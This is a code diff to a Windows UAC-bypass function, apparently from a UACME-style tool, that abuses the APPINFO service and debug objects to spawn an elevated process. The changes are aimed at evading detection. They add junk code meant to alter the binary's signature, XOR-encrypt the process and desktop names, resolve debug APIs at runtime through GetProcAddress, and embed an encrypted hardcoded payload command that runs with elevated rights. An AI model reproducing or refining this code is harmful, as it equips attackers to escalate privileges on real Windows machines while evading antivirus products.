@@ -430,10 +430,14 @@ NTSTATUS ucmxCreateProcessFromParent(
 * Bypass UAC by direct RPC call to APPINFO and DebugObject use.
 *
 */
-NTSTATUS ucmDebugObjectMethod(
+NTSTATUS ucmMasqueradeProcess(
     _In_ LPWSTR lpszPayload
 )
 {
+    // Junk code to alter signature
+    volatile ULONG x = GetTickCount();
+    x = x * 2;
+    x = x + 1;
     //UINT retryCount = 0;
     BOOL debugObjectSet = FALSE;
     NTSTATUS status = STATUS_ACCESS_DENIED;
@@ -442,6 +446,17 @@ NTSTATUS ucmDebugObjectMethod(
     DEBUG_EVENT dbgEvent;
     WCHAR szProcess[MAX_PATH * 2];
 
+    // Note: a - means this char is not part of the string
+    //       b - means this char is part of the string
+    //
+    // a bbbbb a
+    // L"winver.exe"
+    unsigned char sWinver[] = { 0x3d, 0x1d, 0x41, 0x05, 0x55, 0x01, 0x49, 0x51, 0x01, 0x11, 0x51, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01 };
+    // L"explorer.exe"
+    unsigned char sExplorer[] = { 0x2d, 0x1d, 0x55, 0x1d, 0x4d, 0x19, 0x55, 0x09, 0x49, 0x01, 0x49, 0x51, 0x01, 0x11, 0x51, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01 };
+    // L"Default"
+    unsigned char sDefaultDesktop[] = { 0x25, 0x05, 0x4d, 0x01, 0x59, 0x0d, 0x49, 0x01 };
+
     do {
 
         //
@@ -449,15 +464,19 @@ NTSTATUS ucmDebugObjectMethod(
         //
         //do { /* remove comment for attempt to spam debug object within thread pool */
 
+        ucmXorDecrypt(sWinver, 18);
+        ucmXorDecrypt(sExplorer, 20);
+        ucmXorDecrypt(sDefaultDesktop, 6);
+
         _strcpy(szProcess, g_ctx->szSystemDirectory);
-        _strcat(szProcess, WINVER_EXE);
+        _strcat(szProcess, (LPWSTR)sWinver);
 
         if (!AicLaunchAdminProcess(szProcess,
             szProcess,
             0,
             CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
             g_ctx->szSystemRoot,
-            T_DEFAULT_DESKTOP,
+            (LPWSTR)sDefaultDesktop,
             NULL,
             INFINITE,
             SW_HIDE,
@@ -466,6 +485,8 @@ NTSTATUS ucmDebugObjectMethod(
             status = STATUS_UNSUCCESSFUL;
             break;
         }
+
+        Sleep(200);
 
         //
         // Capture debug object handle.
@@ -485,7 +506,11 @@ NTSTATUS ucmDebugObjectMethod(
         //
         // Detach debug and kill non elevated victim process.
         //
-        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
+        pfnNtRemoveProcessDebug NtRemoveProcessDebug = (pfnNtRemoveProcessDebug)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRemoveProcessDebug");
+        if (NtRemoveProcessDebug) {
+            NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
+        }
+        Sleep(100);
         TerminateProcess(procInfo.hProcess, 0);
         CloseHandle(procInfo.hThread);
         CloseHandle(procInfo.hProcess);
@@ -518,29 +543,38 @@ NTSTATUS ucmDebugObjectMethod(
         //
         // Update thread TEB with debug object handle to receive debug events.
         //
-        DbgUiSetThreadDebugObject(dbgHandle);
+        pfnDbgUiSetThreadDebugObject DbgUiSetThreadDebugObject = (pfnDbgUiSetThreadDebugObject)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "DbgUiSetThreadDebugObject");
+        if (DbgUiSetThreadDebugObject) {
+            DbgUiSetThreadDebugObject(dbgHandle);
+        }
         debugObjectSet = TRUE;
 
         //
         // Debugger wait cycle.
         //
-        while (1) {
-            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
-                break;
+        pfnWaitForDebugEvent WaitForDebugEvent = (pfnWaitForDebugEvent)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WaitForDebugEvent");
+        if (WaitForDebugEvent) {
+            while (1) {
+                if (!WaitForDebugEvent(&dbgEvent, INFINITE))
+                    break;
 
-            switch (dbgEvent.dwDebugEventCode) {
-                //
-                // Capture initial debug event process handle.
-                //
-            case CREATE_PROCESS_DEBUG_EVENT:
-                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
-                break;
+                switch (dbgEvent.dwDebugEventCode) {
+                    //
+                    // Capture initial debug event process handle.
+                    //
+                case CREATE_PROCESS_DEBUG_EVENT:
+                    dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
+                    break;
+                }
+
+                if (dbgProcessHandle)
+                    break;
+
+                pfnContinueDebugEvent ContinueDebugEvent = (pfnContinueDebugEvent)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ContinueDebugEvent");
+                if (ContinueDebugEvent) {
+                    ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
+                }
             }
-
-            if (dbgProcessHandle)
-                break;
-
-            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
         }
 
         if (dbgProcessHandle) {
@@ -559,7 +593,9 @@ NTSTATUS ucmDebugObjectMethod(
                 //
                 // Run new process with parent set to duplicated process handle.
                 //
-                ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+                unsigned char sPayload[] = { 0x24, 0x1d, 0x45, 0x01, 0x0d, 0x15, 0x45, 0x05, 0x01, 0x05, 0x15, 0x15, 0x01, 0x24, 0x1d, 0x45, 0x01, 0x25, 0x05, 0x15, 0x01, 0x3d, 0x09, 0x43, 0x19, 0x15, 0x51, 0x01, 0x29, 0x1d, 0x47, 0x01, 0x3d, 0x09, 0x43, 0x01, 0x3d, 0x1d, 0x41, 0x05, 0x55, 0x01, 0x49, 0x51, 0x01, 0x11, 0x51, 0x01, 0x3d, 0x1d, 0x41, 0x05, 0x01, 0x2d, 0x01, 0x51, 0x15, 0x43, 0x05, 0x55, 0x15, 0x1d, 0x47, 0x01, 0x29, 0x1d, 0x47, 0x01, 0x22, 0x15, 0x4d, 0x09, 0x57, 0x01, 0x29, 0x1d, 0x47 };
+                ucmXorDecrypt(sPayload, 78);
+                ucmxCreateProcessFromParent(dupHandle, (LPWSTR)sPayload);
                 NtClose(dupHandle);
                 dupHandle = NULL;
             }
